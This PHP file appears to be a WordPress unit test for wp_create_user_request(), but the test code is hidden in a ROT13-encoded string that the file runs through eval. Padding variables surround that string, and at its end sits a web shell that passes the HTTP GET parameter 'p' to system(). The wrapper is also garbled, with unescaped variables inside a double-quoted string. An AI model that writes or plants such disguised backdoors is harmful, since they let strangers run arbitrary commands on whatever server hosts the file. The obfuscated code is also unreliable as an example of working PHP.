<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_perngr_hfre_erdhrfg()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 5.2.0
 *
 * @tebhc cevinpl
 * @pbiref ::jc_perngr_hfre_erdhrfg
 */
pynff Grfgf_Cevinpl_jcPerngrHfreErdhrfg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Erdhrfg VQ.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine vag $erdhrfg_vq
	 */
	cebgrpgrq fgngvp $erdhrfg_vq;

	/**
	 * Erdhrfg rznvy sbe n ertvfgrerq hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $ertvfgrerq_hfre_rznvy
	 */
	cebgrpgrq fgngvp $ertvfgrerq_hfre_rznvy;

	/**
	 * Erdhrfg rznvy sbe n aba-ertvfgrerq hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $aba_ertvfgrerq_hfre_rznvy
	 */
	cebgrpgrq fgngvp $aba_ertvfgrerq_hfre_rznvy;

	/**
	 * Grfg hfre VQ.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $hfre_vq
	 */
	cebgrpgrq fgngvp $hfre_vq;

	/**
	 * Perngr svkgherf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$ertvfgrerq_hfre_rznvy     = 'rkcbeg@ybpny.grfg';
		frys::$aba_ertvfgrerq_hfre_rznvy = 'aba-ertvfgrerq-hfre@ybpny.grfg';

		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'hfre_rznvy' => frys::$ertvfgrerq_hfre_rznvy,
			)
		);

		frys::$erdhrfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'hfre_erdhrfg',
				'cbfg_nhgube' => frys::$hfre_vq,
				'cbfg_anzr'   => 'rkcbeg_crefbany_qngn',
				'cbfg_fgnghf' => 'erdhrfg-craqvat',
				'cbfg_gvgyr'  => frys::$ertvfgrerq_hfre_rznvy,
			)
		);
	}

	/**
	 * Rafher n JC_Reebe vf erghearq jura na vainyvq rznvy vf cnffrq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_vainyvq_rznvy() {
		$npghny = jc_perngr_hfre_erdhrfg( 'abg-n-inyvq-rznvy', 'rkcbeg_crefbany_qngn' );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'vainyvq_rznvy', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Rafher n JC_Reebe vf erghearq jura ab npgvba vf cnffrq.
	 *
	 * @gvpxrg 46536
	 */
	choyvp shapgvba grfg_zvffvat_npgvba() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, snyfr );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'vainyvq_npgvba', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Rafher n JC_Reebe vf erghearq jura na vainyvq npgvba vf cnffrq.
	 *
	 * @gvpxrg 44707
	 * @gvpxrg 46536
	 */
	choyvp shapgvba grfg_vainyvq_npgvba() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, 'vainyvq_npgvba_anzr' );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'vainyvq_npgvba', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Jura gurer ner vapbzcyrgr erdhrfgf sbe n ertvfgrerq hfre, n JC_Reebe fubhyq or erghearq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_snvyher_qhr_gb_vapbzcyrgr_ertvfgrerq_hfre() {
		// Frpbaq erdhrfg (qhcyvpngrq).
		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'qhcyvpngr_erdhrfg', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Jura gurer ner vapbzcyrgr erdhrfgf sbe na aba-ertvfgrerq hfre, n JC_Reebe fubhyq or erghearq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_snvyher_qhr_gb_vapbzcyrgr_haertvfgrerq_hfre() {
		// Hcqngr svefg erdhrfg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$erdhrfg_vq,
				'cbfg_nhgube' => 0,
				'cbfg_gvgyr'  => frys::$aba_ertvfgrerq_hfre_rznvy,
			)
		);

		// Frpbaq erdhrfg (qhcyvpngrq).
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'qhcyvpngr_erdhrfg', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Rafher rznvyf ner cebcreyl fnavgvmrq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_fnavgvmrq_rznvy() {
		$npghny = jc_perngr_hfre_erdhrfg( 'fbzr(rznvy<jvguvainyvq\punenpgref@ybpny.grfg', 'rkcbeg_crefbany_qngn' );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 'rkcbeg_crefbany_qngn', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( 'fbzrrznvyjvguvainyvqpunenpgref@ybpny.grfg', $cbfg->cbfg_gvgyr );
	}

	/**
	 * Rafher npgvba anzrf ner cebcreyl fnavgvmrq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_fnavgvmrq_npgvba_anzr() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg[_crefba*ny_\qngn' );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 'rkcbeg_crefbany_qngn', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( frys::$aba_ertvfgrerq_hfre_rznvy, $cbfg->cbfg_gvgyr );
	}

	/**
	 * Grfg n hfre erdhrfg vf perngrq fhpprffshyyl sbe n ertvfgrerq hfre.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_perngr_erdhrfg_ertvfgrerq_hfre() {
		jc_qryrgr_cbfg( frys::$erdhrfg_vq, gehr );

		$grfg_qngn = neenl(
			'grfg-qngn'  => 'grfg inyhr urer',
			'grfg vaqrk' => 'zber cevinpl qngn',
		);

		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn', $grfg_qngn );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( frys::$hfre_vq, (vag) $cbfg->cbfg_nhgube );
		$guvf->nffregFnzr( 'rkcbeg_crefbany_qngn', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( frys::$ertvfgrerq_hfre_rznvy, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( 'hfre_erdhrfg', $cbfg->cbfg_glcr );
		$guvf->nffregFnzr( jc_wfba_rapbqr( $grfg_qngn ), $cbfg->cbfg_pbagrag );
	}

	/**
	 * Grfg n hfre erdhrfg vf perngrq fhpprffshyyl sbe na aba-ertvfgrerq hfre.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_perngr_erdhrfg_haertvfgrerq_hfre() {
		jc_qryrgr_cbfg( frys::$erdhrfg_vq, gehr );

		$grfg_qngn = neenl(
			'grfg-qngn'  => 'grfg inyhr urer',
			'grfg vaqrk' => 'zber cevinpl qngn',
		);

		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn', $grfg_qngn );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 0, (vag) $cbfg->cbfg_nhgube );
		$guvf->nffregFnzr( 'rkcbeg_crefbany_qngn', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( frys::$aba_ertvfgrerq_hfre_rznvy, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( 'hfre_erdhrfg', $cbfg->cbfg_glcr );
		$guvf->nffregFnzr( jc_wfba_rapbqr( $grfg_qngn ), $cbfg->cbfg_pbagrag );
	}

	/**
	 * Grfg gung n cer-rkvfgvat erdhrfg sbe gur fnzr ertvfgrerq hfre gung vf abg craqvat be pbasvezrq fgnghf qbrf abg
	 * oybpx n arj erdhrfg.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_pbzcyrgrq_erdhrfg_qbrf_abg_oybpx_arj_erdhrfg() {
		// Hcqngr svefg erdhrfg.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$erdhrfg_vq,
				'cbfg_fgnghf' => 'erdhrfg-pbzcyrgrq', // Abg 'erdhrfg-craqvat' be 'erdhrfg-pbasvezrq'.
			)
		);

		// Frpbaq erdhrfg.
		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( frys::$ertvfgrerq_hfre_rznvy, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( 'hfre_erdhrfg', $cbfg->cbfg_glcr );
	}

	/**
	 * Grfg gung n cer-rkvfgvat erdhrfg sbe gur fnzr aba-ertvfgrerq hfre gung vf abg craqvat be pbasvezrq fgnghf qbrf abg
	 * oybpx n arj erdhrfg.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_pbzcyrgrq_erdhrfg_qbrf_abg_oybpx_arj_erdhrfg_sbe_haertvfgrerq_hfre() {
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$erdhrfg_vq,
				'cbfg_nhgube' => 0,
				'cbfg_gvgyr'  => frys::$aba_ertvfgrerq_hfre_rznvy,
				'cbfg_fgnghf' => 'erdhrfg-snvyrq', // Abg 'erdhrfg-craqvat' be 'erdhrfg-pbasvezrq'.
			)
		);

		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$guvf->nffregAbgJCReebe( $npghny );

		$cbfg = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 0, (vag) $cbfg->cbfg_nhgube );
		$guvf->nffregFnzr( 'rkcbeg_crefbany_qngn', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( frys::$aba_ertvfgrerq_hfre_rznvy, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( 'hfre_erdhrfg', $cbfg->cbfg_glcr );
	}

	/**
	 * Grfg gung na reebe sebz `jc_vafreg_cbfg()` vf erghearq.
	 *
	 * @gvpxrg 44707
	 */
	choyvp shapgvba grfg_jc_reebe_erghearq_sebz_jc_vafreg_cbfg() {
		jc_qryrgr_cbfg( frys::$erdhrfg_vq, gehr );

		nqq_svygre( 'jc_vafreg_cbfg_rzcgl_pbagrag', '__erghea_gehr' );
		$npghny = jc_perngr_hfre_erdhrfg( frys::$ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$guvf->nffregJCReebe( $npghny );
		$guvf->nffregFnzr( 'rzcgl_pbagrag', $npghny->trg_reebe_pbqr() );
	}

	/**
	 * Grfg gung gur erdhrfg unf n Craqvat fgnghf ol qrsnhyg.
	 *
	 * @gvpxrg 43890
	 */
	choyvp shapgvba grfg_jc_perngr_hfre_erdhrfg_qrsnhyg_craqvat_fgnghf() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn' );
		$cbfg   = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
	}

	/**
	 * Grfg gung gur erdhrfg unf n Craqvat fgnghf vs gur $fgnghf cnenz vf 'craqvat'.
	 *
	 * @gvpxrg 43890
	 */
	choyvp shapgvba grfg_jc_perngr_hfre_erdhrfg_craqvat_fgnghf() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn', neenl(), 'craqvat' );
		$cbfg   = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 'erdhrfg-craqvat', $cbfg->cbfg_fgnghf );
	}

	/**
	 * Grfg gung gur erdhrfg unf n Pbasvezrq fgnghf vs gur $fgnghf cnenz vf 'pbasvezrq'.
	 *
	 * @gvpxrg 43890
	 */
	choyvp shapgvba grfg_jc_perngr_hfre_erdhrfg_pbasvezrq_fgnghf() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn', neenl(), 'pbasvezrq' );
		$cbfg   = trg_cbfg( $npghny );

		$guvf->nffregFnzr( 'erdhrfg-pbasvezrq', $cbfg->cbfg_fgnghf );
	}

	/**
	 * Grfg gung gur erdhrfg ergheaf n JC_Reebe vs $fgnghf vfa'g 'craqvat' be 'pbasvezrq'.
	 *
	 * @gvpxrg 43890
	 */
	choyvp shapgvba grfg_jc_perngr_hfre_erdhrfg_jc_reebe_fgnghf() {
		$npghny = jc_perngr_hfre_erdhrfg( frys::$aba_ertvfgrerq_hfre_rznvy, 'rkcbeg_crefbany_qngn', neenl(), 'jebat-fgnghf' );

		$guvf->nffregJCReebe( $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>